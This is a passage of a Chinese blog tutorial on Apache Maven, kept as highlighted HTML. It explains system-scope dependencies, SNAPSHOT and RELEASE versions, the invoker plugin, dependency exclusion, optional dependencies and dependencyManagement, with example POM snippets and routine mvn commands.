class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--外部依赖--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>helloMaven<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>         <span class="hljs-comment">&lt;!--依赖范围--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--依赖所在位置--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>D:\maven\helloMaven\target\helloMaven-1.0-SNAPSHOT.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果有了项目但是不知道groupId，artifactId在哪看可以在jar包中查看</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-5.png" alt="image-20220115090557928"></p><p>其中<systemPath>是指代jar包的路径</systemPath></p><p>然后执行下面的命令进行编译</p><blockquote><p>mvn clean compile</p></blockquote><p>然后使用下面命令来设置临时的环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> classpath=%classpath%;D:\maven\helloMaven\target\helloMaven-1.0-SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p>然后使用java 组织名App运行</p><p>然后idea版本的</p><p>首先File-&gt;Project Structure</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-6.png" alt="image-20220114204612350"></p><p>然后Liberaies的add</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-7.png" alt="image-20220114204711280"></p><h4 id="Archetype-Maven的模板"><a href="#Archetype-Maven的模板" class="headerlink" title="Archetype(Maven的模板)"></a>Archetype(Maven的模板)</h4><p>模板一般由下面这几部分构成</p><ul><li>maven-archetype-plugin：Archetype 插件。</li><li>archetype-packaging：用于描述 Archetype 的生命周期与构建项目软件包。</li><li>archetype-models：用于描述类与引用。</li><li>archetype-common：核心类。</li><li>archetype-testing：用于测试 Maven Archetype 的内部组件。</li></ul><p>&#x3D;&#x3D;众所周知!!!!&#x3D;&#x3D;maven的功能都是用插件来实现的</p><p>他是由maven-archetype-plugin 的插件实现的来实现的</p><h4 id="SNAPSHOT和RELEASE"><a href="#SNAPSHOT和RELEASE" class="headerlink" title="SNAPSHOT和RELEASE"></a>SNAPSHOT和RELEASE</h4><p>有的时候一个项目可能由不同的部门来负责不同的部分,但是如果有一个部门更新换代很快那么就要经常更换maven依赖,为了方便解决我们可以使用SNAPSHOT</p><p>定义一个组件或模块为快照版本，只需要在其 pom.xml 中版本号（version 元素的值）后加上 -SNAPSHOT 即可，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>helloMaven<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样他不用重复的修改pox.xml文件了,会自动更新代码库</p><blockquote><p>默认maven会每天更新一次库如果要强行更新请使用下面的命令</p><p>mvn clean package -U</p></blockquote><p>SNAPSHOT和RELEASE的区别是</p><p>前者是属于不稳定版本,后者是属于稳定的发布版本</p><table><thead><tr><th>区别</th><th>SNAPSHOT 版本</th><th>RELEASE 版本</th></tr></thead><tbody><tr><td>定义</td><td>版本号中带有 -SNAPSHOT</td><td>版本号中不带有 -SNAPSHOT</td></tr><tr><td>发布仓库</td><td>Snapshot 快照仓库</td><td>Release 发行仓库</td></tr><tr><td>是否从远程仓库自动获取更新</td><td>在不更改版本号的前提下，直接编译打包时，Maven 会自动从远程仓库上下载最新的快照版本。</td><td>在不更改版本号的前提下，直接编译打包时，如果本地仓库已经存在该版本的模块，则 Maven 不会主动去远程仓库下载。</td></tr><tr><td>稳定性</td><td>快照版本往往对应了大量带有时间戳的构件，具有不稳定性。</td><td>发布版本只对应了唯一的构件，具有稳定性。</td></tr><tr><td>使用场景</td><td>快照版本只应该在组织内部的项目中依赖使用。</td><td>Maven 项目使用的组织外的依赖项都应该时发布版本的，不应该使用任何的快照版本依赖，否则会造成潜在的风险。</td></tr><tr><td>发布前是否需要修改</td><td>当项目经过完善的测试后，需要上线时，应该将项目从快照版本更改为发布版本</td><td>不需要修改</td></tr></tbody></table><h4 id="自动打包插件"><a href="#自动打包插件" class="headerlink" title="自动打包插件"></a>自动打包插件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 添加invoker 插件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-invoker-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">debug</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">debug</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--设置 invkoer插件 添加的 pom 文件所在的文件夹  --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">projectsDirectory</span>&gt;</span>D:\maven<span class="hljs-tag">&lt;/<span class="hljs-name">projectsDirectory</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 设置 invkoer插件 添加的 pom 文件 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">pomIncludes</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">pomInclude</span>&gt;</span>secondMaven\pom.xml<span class="hljs-tag">&lt;/<span class="hljs-name">pomInclude</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">pomInclude</span>&gt;</span>thirdMaven\pom.xml<span class="hljs-tag">&lt;/<span class="hljs-name">pomInclude</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">pomIncludes</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>id-integration-test<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                <span class="hljs-comment">&lt;!-- 执行的目标 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>run<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是自动打包插件,可以将多个maven项目一起进行打包,下图是所用到的项目</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-8.png" alt="image-20220115085148870"></p><blockquote><p>mvn help:describe -Dplugin&#x3D;invoker 使用打包软件进行打包</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Name: Apache Maven Invoker Plugin<br>Description: The Maven Invoker Plugin is used to run a <span class="hljs-built_in">set</span> of Maven projects.<br>  The plugin can determine whether each project execution is successful, and<br>  optionally can verify the output generated from a given project execution.<br>Group Id: org.apache.maven.plugins<br>Artifact Id: maven-invoker-plugin<br>Version: 3.2.2<br>Goal Prefix: invoker<br><br>This plugin has 6 goals:<br><br>invoker:<span class="hljs-built_in">help</span><br>  Description: Display <span class="hljs-built_in">help</span> information on maven-invoker-plugin.<br>    Call mvn invoker:<span class="hljs-built_in">help</span> -Ddetail=<span class="hljs-literal">true</span> -Dgoal=&lt;goal-name&gt; to display parameter<br>    details.<br><br>invoker:install<br>  Description: Installs the project artifacts of the main build into the<br>    <span class="hljs-built_in">local</span> repository as a preparation to run the sub projects. More precisely,<br>    all artifacts of the project itself, all its locally reachable parent POMs<br>    and all its dependencies from the reactor will be installed to the <span class="hljs-built_in">local</span><br>    repository.<br><br>invoker:integration-test<br>  Description: Searches <span class="hljs-keyword">for</span> integration <span class="hljs-built_in">test</span> Maven projects, and executes<br>    each, collecting a <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> the project directory, will never fail the build,<br>    designed to be used <span class="hljs-keyword">in</span> conjunction with the verify mojo.<br><br>invoker:report<br>  Description: Generate a report based on the results of the Maven<br>    invocations. Note: This mojo doesn<span class="hljs-string">&#x27;t fork any lifecycle, if you have a</span><br><span class="hljs-string">    clean working copy, you have to use a command like mvn clean</span><br><span class="hljs-string">    integration-test site to ensure the build results are present when this</span><br><span class="hljs-string">    goal is invoked.</span><br><span class="hljs-string">  Note: This goal should be used as a Maven report.</span><br><span class="hljs-string"></span><br><span class="hljs-string">invoker:run</span><br><span class="hljs-string">  Description: Searches for integration test Maven projects, and executes</span><br><span class="hljs-string">    each, collecting a log in the project directory, and outputting the results</span><br><span class="hljs-string">    to the command line.</span><br><span class="hljs-string"></span><br><span class="hljs-string">invoker:verify</span><br><span class="hljs-string">  Description: Checks the results of maven-invoker-plugin based integration</span><br><span class="hljs-string">    tests and fails the build if any tests failed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">For more information, run &#x27;</span>mvn <span class="hljs-built_in">help</span>:describe [...] -Ddetail<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[INFO] ------------------------------------------------------------------------</span><br><span class="hljs-string">[INFO] BUILD SUCCESS</span><br><span class="hljs-string">[INFO] ------------------------------------------------------------------------</span><br><span class="hljs-string">[INFO] Total time:  02:53 min</span><br><span class="hljs-string">[INFO] Finished at: 2022-01-15T09:16:27+08:00</span><br><span class="hljs-string">[INFO] ------------------------------------------------------------------------</span><br><span class="hljs-string"></span><br><span class="hljs-string">Process finished with exit code 0</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>可以看到上面这些成功信息</p><h4 id="依赖排除和可选依赖"><a href="#依赖排除和可选依赖" class="headerlink" title="依赖排除和可选依赖"></a>依赖排除和可选依赖</h4><p>当有A依赖B，B依赖Y和X，但是Y和X互斥我们就需要排除一个依赖了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>B<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 设置排除 --&gt;</span><br>            <span class="hljs-comment">&lt;!-- 排除依赖必须基于直接依赖中的间接依赖设置为可以依赖为 false --&gt;</span><br>            <span class="hljs-comment">&lt;!-- 设置当前依赖中是否使用间接依赖 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--设置具体排除--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>X<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在需要排除的依赖里面添加(B里面的X进行一波排除),无需指定版本</p><p>下面是可选依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>X<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--设置可选依赖  --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是optional为true则代表不可以被继承下去</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>这个我在idea的时候经常遇见,就是我创建一个maven项目后,又在该项目下继续创建一个maven项目他就会自动把外层项目当成父项目</p><p>结果如下</p><p><img src="/.com//....%5Cpublic%5Cimg%5CMaven-10.png" alt="image-20220116090705000"></p><p><img src="/.com//....%5Cpublic%5Cimg%5CMaven-11.png" alt="image-20220116095724720"></p><p>可以看出他继承了父依赖</p><p>下面是可以继承的pom参数</p><table><thead><tr><th>元素</th><th>描述</th></tr></thead><tbody><tr><td>groupId</td><td>项目组 ID，项目坐标的核心元素</td></tr><tr><td>version</td><td>项目版本，项目坐标的核心元素</td></tr><tr><td>description</td><td>项目的描述信息</td></tr><tr><td>organization</td><td>项目的组织信息</td></tr><tr><td>inceptionYear</td><td>项目的创始年份</td></tr><tr><td>url</td><td>项目的URL地址</td></tr><tr><td>developers</td><td>项目的开发者信息</td></tr><tr><td>contributors</td><td>项目的贡献者信息</td></tr><tr><td>distributionManagement</td><td>项目的部署配置</td></tr><tr><td>issueManagement</td><td>项目的缺陷跟踪系统信息</td></tr><tr><td>ciManagement</td><td>项目的持续集成系统信息</td></tr><tr><td>scm</td><td>项目的版本控制系统信息</td></tr><tr><td>mailingLists</td><td>项目的邮件列表信息</td></tr><tr><td>properties</td><td>自定义的Maven属性</td></tr><tr><td>dependencies</td><td>项目的依赖配置</td></tr><tr><td>dependencyManagement</td><td>项目的依赖管理配置</td></tr><tr><td>repositories</td><td>项目的仓库配置</td></tr><tr><td>build</td><td>包括项目的源码目录配置、输出目录配置、插件配置、插件管理配置等</td></tr><tr><td>reporting</td><td>包括项目的报告输出目录配置、报告插件配置等</td></tr></tbody></table><h4 id="默认依赖版本"><a href="#默认依赖版本" class="headerlink" title="默认依赖版本"></a>默认依赖版本</h4><p>使用dependencyManagement可以为包设置默认的版本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--由于不是继承，所以必须重新添加 groupId 和 version--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>App-Data-lib<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--dependencyManagement 标签用于控制子模块的依赖版本等信息 --&gt;</span><br>    <span class="hljs-comment">&lt;!-- 该标签只用来控制版本，不能将依赖引入 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用的properties标签中定义的属性 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用的properties标签中定义的属性 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-comment">&lt;!-- &lt;scope&gt;test&lt;/scope&gt; --&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用的properties标签中定义的属性 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用的properties标签中定义的属性 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--声明依赖--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里junit在dependencyManagement的外部并没有指定版本就会使用dependencyManagement里面的版本</p><p>&#x3D;&#x3D;如果子类继承的父类有dependencyManagement,则子类也可以享受默认版本的便利,不过dependencyManagement导入的依赖并不会生效,只有没被dependencyManagement包裹的dependencies才会生效&#x3D;&#x3D;</p><p>在依赖范围中提过import,这个依赖范围只会在有dependencyManagement的时候才会生效,因为他的作用是将dependencyManagement复制到当前项目中,使用如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 